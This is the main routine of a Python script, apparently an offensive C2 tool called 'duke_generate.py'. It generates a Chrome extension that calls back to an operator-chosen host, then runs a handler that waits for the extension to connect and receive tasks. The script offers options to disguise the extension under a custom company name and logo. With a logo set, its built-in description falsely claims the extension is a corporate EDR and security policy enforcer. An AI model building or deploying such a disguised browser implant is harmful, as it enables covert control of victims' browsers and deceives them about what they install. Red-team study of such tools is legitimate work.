# MAIN
# ──────────────────────────────────────────────────────

def usage():
    print(f"""
{BOLD}Usage:{RESET}
  python3 duke_generate.py <listen_ip> <listen_port> <callback_ip> <callback_port> [flags]

{BOLD}Arguments:{RESET}
  listen_ip       Local IP/host to bind the handler to (e.g. 0.0.0.0)
  listen_port     Local port to bind the handler to
  callback_ip     IP/host the extension calls back to (baked into bg.js)
  callback_port   Port the extension calls back to

{BOLD}Flags:{RESET}
  --https                       Force HTTPS scheme (auto-detected for port 443)
  --fastpoll                    Use 200ms short-poll instead of default long-poll
  --company-logo <file.png>     Custom extension icon (PNG file)
  --extension-name <name>       Custom extension name (default: "Duke Extension")
  --company-name <name>         Company name for extension description

{BOLD}Examples:{RESET}
  python3 duke_generate.py 0.0.0.0 8081 10.10.14.148 8081
  python3 duke_generate.py 0.0.0.0 80 myhost.ngrok-free.app 443
  python3 duke_generate.py 0.0.0.0 8081 10.10.14.148 8081 \\
      --company-logo logo.png --extension-name "Acme Security" --company-name "Acme Corp"

Generates ./duke.zip then starts the interactive handler.
Default transport: long-poll (server holds connection up to 30s per request).
""")
    sys.exit(1)


def main():
    global POLL_MODE

    if len(sys.argv) < 5:
        usage()

    listen_ip     = sys.argv[1]
    listen_port   = int(sys.argv[2])
    callback_ip   = sys.argv[3]
    callback_port = int(sys.argv[4])

    flags = sys.argv[5:]

    # Parse boolean flags
    force_https  = '--https' in flags
    use_fastpoll = '--fastpoll' in flags

    # Parse value flags
    def get_flag_value(flag_name):
        """Extract --flag value from argv, return None if not present."""
        for i, f in enumerate(flags):
            if f == flag_name and i + 1 < len(flags):
                return flags[i + 1]
        return None

    company_logo_path = get_flag_value('--company-logo')
    extension_name    = get_flag_value('--extension-name')
    company_name      = get_flag_value('--company-name')

    scheme = 'https' if (force_https or callback_port == 443) else 'http'
    poll_mode = 'fastpoll' if use_fastpoll else 'longpoll'
    POLL_MODE = poll_mode

    # Load company logo if provided
    icon_data = None
    if company_logo_path:
        logo_path = os.path.expanduser(company_logo_path)
        if os.path.isfile(logo_path):
            with open(logo_path, 'rb') as f:
                icon_data = f.read()
            print(f"  {GREEN}[+] Loaded company logo: {logo_path} ({len(icon_data)} bytes){RESET}")
        else:
            print(f"  {RED}[!] Logo file not found: {logo_path}{RESET}")
            sys.exit(1)

    # Build extension description
    ext_description = None
    if company_logo_path:
        ext_description = (
            "Corporate browser policy validation. "
            "Endpoint detection (EDR), content security policies and "
            "extension whitelisting policies enforcer for Google Chrome."
        )
        if company_name:
            ext_description += f" Ownership of {company_name}."

    # ── Step 1: Generate the extension zip ──
    print_banner()

    # Determine output zip filename
    if company_name:
        zip_prefix = ''.join(c if c.isalnum() else '_' for c in company_name.lower()).strip('_')
        zip_prefix = zip_prefix or 'extension'
    else:
        zip_prefix = 'duke'
    output_zip = f'{zip_prefix}.zip'

    out = generate_extension(
        callback_ip, callback_port,
        scheme=scheme, poll_mode=poll_mode,
        ext_name=extension_name,
        ext_description=ext_description,
        icon_data=icon_data,
        company_name=company_name,
        output_path=output_zip,
    )
    abs_out = os.path.abspath(out)

    transport_label = f"{GREEN}fast-poll 200ms{RESET}" if use_fastpoll else f"{YELLOW}long-poll{RESET}"
    disp_name = extension_name or "Duke Extension"
    print(f"  {GREEN}{BOLD}[+] Extension generated:{RESET} {abs_out}")
    print(f"  {CYAN}    Name: {disp_name}{RESET}")
    if ext_description:
        desc_short = ext_description if len(ext_description) <= 70 else ext_description[:67] + '...'
        print(f"  {CYAN}    Desc: {desc_short}{RESET}")
    if icon_data:
        print(f"  {CYAN}    Icon: custom ({len(icon_data)} bytes){RESET}")
    print(f"  {CYAN}    Callback -> {scheme}://{callback_ip}:{callback_port}{RESET}")
    print(f"  {BLUE}    Transport: {transport_label}")
    print()

    # ── Step 2: Start the HTTP handler (always threaded for long-poll support) ──
    try:
        srv = ThreadedHTTPServer((listen_ip, listen_port), ProxyHandler)
    except OSError as e:
        print(f"  {RED}{BOLD}[!] Cannot bind {listen_ip}:{listen_port} — {e}{RESET}")
        sys.exit(1)

    print(f"  {GREEN}[+] Handler listening on {listen_ip}:{listen_port}{RESET}")
    print(f"  {CYAN}    Extension callback -> {scheme}://{callback_ip}:{callback_port}{RESET}")
    print(f"  {GREEN}[+] Waiting for extension to connect...{RESET}")
    print(f"  {YELLOW}[*] Tip: use 'preload <url>' to queue tasks before the extension connects{RESET}")
    print()

    srv_thread = threading.Thread(target=srv.serve_forever, daemon=True)
    srv_thread.start()

    # Start preload garbage collector
    threading.Thread(target=preload_gc_loop, daemon=True).start()

    handler_loop()


if __name__ == '__main__':
    main()
